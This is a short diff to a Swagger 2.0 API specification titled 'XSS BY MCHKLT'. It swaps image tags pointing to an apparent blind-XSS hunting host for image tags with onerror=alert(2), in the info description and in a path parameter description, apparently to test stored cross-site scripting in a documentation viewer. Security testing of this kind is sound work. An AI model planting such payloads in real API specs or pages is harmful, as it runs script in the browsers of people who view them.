@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS BY MCHKLT
   description: |
-    <img src=https://bxsshunter.com/static/images/white.png>
+    <img src=x onerror=alert(2)>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <img src=https://bxsshunter.com/static/images/white.png>
+            <img src=x onerror=alert(2)>
           format: int64
           in: path
           name: id
